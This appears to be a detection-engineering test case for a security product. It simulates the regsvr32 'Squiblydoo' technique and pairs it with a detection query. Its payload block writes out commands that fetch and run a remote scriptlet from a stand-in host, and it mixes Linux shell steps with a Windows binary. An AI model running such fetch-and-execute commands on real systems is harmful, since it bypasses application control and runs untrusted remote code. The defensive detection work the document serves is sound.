identity.name: Windows regsvr32 Squiblydoo Proxy Execution via COM Scriptlet
identity.summary: An attacker uses regsvr32 to execute a remote COM scriptlet (Squiblydoo technique) that bypasses application control by leveraging the /i:http://192.0.2.1/x.sct parameter. Cortex should detect the exe
identity.description: An attacker uses regsvr32 to execute a remote COM scriptlet (Squiblydoo technique) that bypasses application control by leveraging the /i:http://192.0.2.1/x.sct parameter. Cortex should detect the execution of regsvr32 with an HTTP URL and scrobj.dll.

payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/x.sct http://192.0.2.1/x.sct
stub chmod +x /tmp/scratch/x.sct
regsvr32 /s /n /u /i:http://192.0.2.1/x.sct scrobj.dll

expected_artifacts.description: Outbound HTTP request to C2 server
COM scriptlet downloaded from remote URL

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Regsvr32 with Remote Scriptlet
biocs.description: Detection of regsvr32 being invoked with /i: parameter pointing to an HTTP URL
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'regsvr32.exe'
| filter action_process_command_line contains '/i:http://'
| filter action_process_command_line contains 'scrobj.dll'
